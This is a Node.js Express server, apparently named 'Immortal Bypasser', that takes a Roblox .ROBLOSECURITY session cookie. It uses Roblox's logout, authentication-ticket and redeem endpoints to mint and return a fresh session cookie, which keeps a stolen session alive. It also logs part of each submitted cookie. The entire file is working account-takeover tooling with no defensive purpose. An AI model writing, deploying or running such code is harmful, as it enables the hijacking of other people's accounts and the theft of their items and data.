const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

app.get('/', (req, res) => res.send('Immortal Bypasser — LIVE'));

app.post('/api/bypass', async (req, res) => {
  const { cookie } = req.body;

  console.log('COOKIE LENGTH:', cookie?.length || 'NONE');
  console.log('STARTS WITH:', cookie?.substring(0, 50) || 'NONE');

  if (!cookie || typeof cookie !== 'string') {
    return res.status(400).json({ error: 'No cookie' });
  }
  if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
    return res.status(400).json({ error: 'Invalid .ROBLOSECURITY format' });
  }

  try {
    // 1. LOGOUT TO GET CSRF
    const logout = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0'
      },
      maxRedirects: 0,
      validateStatus: () => true
    });

    const csrf = logout.headers['x-csrf-token'];
    console.log('CSRF:', csrf ? 'GOT' : 'NONE');
    console.log('LOGOUT STATUS:', logout.status);

    if (!csrf) {
      if (logout.status === 403) return res.status(400).json({ error: '2FA or PIN enabled' });
      if (logout.status === 401) return res.status(400).json({ error: 'Cookie expired' });
      return res.status(400).json({ error: 'No CSRF — cookie dead' });
    }

    // 2. GET TICKET
    const ticketRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
      headers: {
        'x-csrf-token': csrf,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Referer': 'https://www.roblox.com/'
      },
      validateStatus: status => status < 500
    });

    const ticket = ticketRes.headers['rbx-authentication-ticket'];
    if (!ticket) {
      console.log('TICKET FAILED:', ticketRes.data);
      return res.status(400).json({ error: 'No ticket — account locked' });
    }

    // 3. REDEEM
    const redeem = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      authenticationTicket: ticket
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const newCookie = redeem.headers['set-cookie']
      ?.find(c => c.includes('.ROBLOSECURITY'))
      ?.split(';')[0]
      ?.split('=')[1];

    if (!newCookie) return res.status(500).json({ error: 'No new cookie in response' });

    res.json({ success: true, newCookie });

  } catch (error) {
    console.error('FULL ERROR:', error.response?.data || error.message);
    const errMsg = error.response?.data || error.message || 'Unknown';
    res.status(500).json({ error: typeof errMsg === 'object' ? JSON.stringify(errMsg) : errMsg });
  }
});

app.listen(process.env.PORT || 3000, '0.0.0.0', () => {
  console.log('SERVER LIVE');
});
